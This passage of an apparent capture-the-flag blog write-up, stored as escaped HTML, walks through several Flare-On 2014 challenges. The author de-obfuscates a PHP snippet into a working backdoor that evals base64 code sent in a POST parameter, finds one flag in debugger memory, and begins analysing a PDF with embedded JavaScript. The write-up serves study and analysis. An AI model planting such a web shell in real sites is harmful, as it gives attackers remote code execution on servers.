#93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;82&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;82&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;do_me&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;range&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;len&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(order)):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;do_me&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;terms[order[i]]&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;do_me&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Produces the following PHP code:



    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;PHP code&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;$_= &amp;#39;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&amp;#39;;&lt;/span&gt;
&lt;span style=&#34;color: #CB4B16&#34;&gt;$__=&amp;#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&amp;#39;;&lt;/span&gt;
&lt;span style=&#34;color: #CB4B16&#34;&gt;$___=&amp;quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&amp;quot;; // base64_decode&lt;/span&gt;
&lt;span style=&#34;color: #CB4B16&#34;&gt;eval($___($__));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Contents of &lt;code&gt;$_&lt;/code&gt; and &lt;code&gt;$__&lt;/code&gt; are clearly encoded in &lt;code&gt;base64&lt;/code&gt; and  &lt;code&gt;$___&lt;/code&gt; is &lt;code&gt;base64_decode&lt;/code&gt;. Base64 can be decoded in Python by calling &lt;code&gt;base64.b64decode&lt;/code&gt;.
Line #4 can be re-written as&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Line 4&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;eval(base64_decode(&amp;#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&amp;#39;));&lt;/span&gt;

&lt;span style=&#34;color: #CB4B16&#34;&gt;// result&lt;/span&gt;

&lt;span style=&#34;color: #CB4B16&#34;&gt;$code=base64_decode($_);    eval($code);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;So it must decode the first base64 blob and eval it. Let&amp;rsquo;s decode it:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Decoded line 4&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;if(isset($_POST[&amp;quot;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&amp;quot;])) &lt;/span&gt;
&lt;span style=&#34;color: #CB4B16&#34;&gt;{ &lt;/span&gt;
&lt;span style=&#34;color: #CB4B16&#34;&gt;eval(base64_decode($_POST[&amp;quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&amp;quot;])); &lt;/span&gt;
&lt;span style=&#34;color: #CB4B16&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;This looks like a POST request. The characters look like a mix of ASCII and Hex values. Let&amp;rsquo;s print them using Python and hope this is the last encoding:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Decoder code in Python&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;mylist&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x4F&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x74&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x44&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x4F&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x54&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x6A&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x76&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x61&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x35&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x72&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x41&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x6C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x72&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x65&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x44&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x53&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x6F&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x6D&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;join(&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;chr&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(item)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;mylist)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Fortunately, we are done.&lt;/p&gt;

&lt;h4 id=&#34;level-2-flag-a11dotthatdotjava5crapatflaredashondotcom-or-a11-that-java5crap-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Level 2 flag: a11DOTthatDOTjava5crapATflareDASHonDOTcom or a11.that.java5crap@flare-on.com&lt;/h4&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;a-name-ch3-a-challenge-3-cheating-my-way-to-the-top:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;&lt;a name=&#34;ch3&#34;&gt;&lt;/a&gt; Challenge 3 - Cheating My Way to the Top&lt;/h2&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Nice job, you&amp;#39;re really knocking these out! Here&amp;#39;s the next binary. The password to the zip archive is &amp;quot;malware&amp;quot; again.
Keep up the good work, and good luck!
-FLARE
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Challenge 3 is a Win32 binary called &lt;code&gt;such_evil&lt;/code&gt;. &lt;code&gt;PE-Studio&lt;/code&gt; does not tell us much.&lt;/p&gt;

&lt;p&gt;Running it will result in this message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/3-1.jpg&#34; alt=&#34;BrokenByte&#34; title=&#34;BrokenByte&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I cheated in this challenge. I just dropped the executable in &lt;code&gt;Immunity Debugger&lt;/code&gt;, ran it and looked in memory when the message box popped up and the email was there:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/3-2.jpg&#34; alt=&#34;Flag in memory&#34; title=&#34;Flag in memory&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;level-3-flag-such-5h311010101-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Level 3 flag: such.5h311010101@flare-on.com&lt;/h4&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;a-name-ch4-a-challenge-4-things-are-getting-cereal:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;&lt;a name=&#34;ch4&#34;&gt;&lt;/a&gt; Challenge 4 - Things are Getting Cereal&lt;/h2&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Well done! Such dedication, much work, wow.
Here&amp;#39;s the next challenge, password is the same as last time. We&amp;#39;ll talk more when you figure it out.
-FLARE
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It&amp;rsquo;s a two page PDF named &lt;code&gt;APT9001.pdf&lt;/code&gt;. First page is a picture of APT1 report and second page is empty.
We can just open the PDF in a &lt;code&gt;HxD&lt;/code&gt; but it won&amp;rsquo;t tell us much.
There are tools that will help us parse the PDF. I used &lt;code&gt;pyew&lt;/code&gt;. You can find a good tutorial for PDF analysis &lt;a href=&#34;https://code.google.com/p/pyew/wiki/PDFAnalysis&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;.&lt;br /&gt;
Let&amp;rsquo;s follow the tutorial:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;pyew output for the PDF&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;python&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;pyew&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;py&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;APT9001&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;pdf&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;PDF&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;File&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;PDFiD&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0.0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;APT9001&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;pdf&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;PDF&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Header:&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;PDF&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1.5&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;obj&lt;/span&gt;                   &lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;endobj&lt;/span&gt;                 &lt;span style=&#34;color: #2AA198&#34;&gt;9&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;stream&lt;/span&gt;                 &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;endstream&lt;/span&gt;              &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;xref&lt;/span&gt;                   &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;trailer&lt;/span&gt;                &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;
 &lt;span style=&#34;color: #93A1A1&#34;&gt;startxref&lt;/span&gt;              &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;Page&lt;/span&gt;                  &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;Encrypt&lt;/span&gt;               &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ObjStm&lt;/span&gt;                &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;JS&lt;/span&gt;                    &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;JavaScript&lt;/span&gt;            &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;AA&lt;/span&gt;                    &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;OpenAction&lt;/span&gt;            &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
 &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;AcroForm&lt;/span&gt;              &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
